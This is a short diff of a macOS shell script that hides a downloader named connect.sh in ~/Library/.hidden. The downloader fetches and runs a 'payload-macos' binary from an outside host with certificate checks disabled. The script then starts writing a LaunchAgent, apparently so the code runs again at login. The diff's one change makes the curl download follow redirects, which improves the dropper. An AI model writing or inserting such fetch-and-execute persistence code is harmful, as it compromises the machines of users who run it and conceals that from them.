@@ -2,7 +2,7 @@
 mkdir -p ~/Library/.hidden
 echo '#!/bin/bash
 cd ~/Library/.hidden
-curl -k -O https://www.angelparliament.com/payload-macos || wget --no-check-certificate --hsts-file /dev/null https://www.angelparliament.com/payload-macos && chmod +x payload-macos && ./payload-macos' > ~/Library/.hidden/connect.sh
+curl -kLO https://www.angelparliament.com/payload-macos || wget --no-check-certificate --hsts-file /dev/null https://www.angelparliament.com/payload-macos && chmod +x payload-macos && ./payload-macos' > ~/Library/.hidden/connect.sh
 chmod +x ~/Library/.hidden/connect.sh
 mkdir -p ~/Library/LaunchAgents
 echo "<plist version=\"1.0\">
